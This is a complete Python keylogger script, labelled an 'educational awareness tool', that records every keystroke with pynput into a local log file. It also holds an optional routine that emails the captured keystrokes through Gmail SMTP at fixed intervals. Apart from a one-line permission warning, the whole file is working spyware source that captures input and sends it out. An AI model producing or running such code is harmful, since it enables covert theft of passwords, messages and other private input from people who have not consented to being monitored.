#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
KEYLOGGER – EDUCATIONAL AWARENESS TOOL (v1)
==========================================
This script records keyboard input and (optionally) sends the logs via email.
It is intended SOLELY for ethical awareness and authorised testing.

DO NOT USE WITHOUT PERMISSION.
"""

import os
import sys
import time
import threading
import smtplib
import logging
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

# ===================== CONFIGURATION =====================

LOG_FILE = "keylog.txt"                # Local log file path
SEND_EMAIL = False                     # Set True to enable email sending
EMAIL_INTERVAL = 60                    # Seconds between email sends

# Email settings (only used if SEND_EMAIL == True)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"   # Use app-specific password for Gmail
RECIPIENT_EMAIL = "recipient@example.com"

# =========================================================

# Set up logging to file
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    filename=LOG_FILE,
    filemode='a'
)

# Global buffer for recent keys (used for email sending)
key_buffer = []
buffer_lock = threading.Lock()

# Flag to control the logging loop
running = True

def on_press(key):
    """Callback for key press events."""
    global key_buffer
    try:
        # Regular characters
        char = key.char
        log_entry = char
    except AttributeError:
        # Special keys
        log_entry = f"[{key.name.upper()}]"
    
    # Write to log file immediately
    logging.info(log_entry)
    
    # Store in buffer for email sending
    with buffer_lock:
        key_buffer.append(log_entry)

def on_release(key):
    """Stop listener on ESC key."""
    if key == keyboard.Key.esc:
        global running
        running = False
        return False  # Stop listener

def send_email(log_content):
    """Send log content via email."""
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = "Keylogger Log Report"
        
        body = f"Keystroke log (last {EMAIL_INTERVAL} seconds):\n\n{log_content}"
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[-] Email failed: {e}")

def email_sender_thread():
    """Background thread that periodically sends buffered logs via email."""
    global key_buffer
    while running:
        time.sleep(EMAIL_INTERVAL)
        if not running:
            break
        with buffer_lock:
            if key_buffer:
                content = "".join(key_buffer)
                key_buffer.clear()
            else:
                content = "[No keys recorded]"
        if SEND_EMAIL:
            send_email(content)

def main():
    """Start the keylogger."""
    print("\n" + "="*60)
    print("KEYLOGGER – EDUCATIONAL AWARENESS TOOL (v1)")
    print("="*60)
    print("Press ESC to stop logging and exit.")
    print("Logs are saved to:", LOG_FILE)
    if SEND_EMAIL:
        print(f"Email reports will be sent every {EMAIL_INTERVAL} seconds.")
    else:
        print("Email sending is DISABLED (only local logging).")
    print("="*60 + "\n")
    
    # Start the email sender thread (if enabled)
    if SEND_EMAIL:
        email_thread = threading.Thread(target=email_sender_thread, daemon=True)
        email_thread.start()
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass
    
    print("\n[!] Keylogger stopped. Logs saved to", LOG_FILE)

if __name__ == "__main__":
    main()